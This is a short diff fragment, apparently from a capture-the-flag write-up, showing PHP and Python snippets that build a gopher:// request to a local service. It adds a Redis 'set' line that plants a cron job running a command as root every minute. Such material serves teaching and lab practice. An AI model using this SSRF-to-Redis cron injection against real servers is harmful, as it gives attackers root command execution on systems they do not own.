@@ -27,7 +27,6 @@ $out .= "Connection: Keep-Alive\r\n\r\n";
 echo $out;
 echo base64_encode($out)
 ?>
-
 ```
 
 
@@ -99,3 +98,8 @@ urlp = 'gopher://127.0.0.1:80/_' + urlp
 print(urlp)
 ```
 
+
+
+
+
+set 1 '\n\n*/1 * * * * root ./readflag
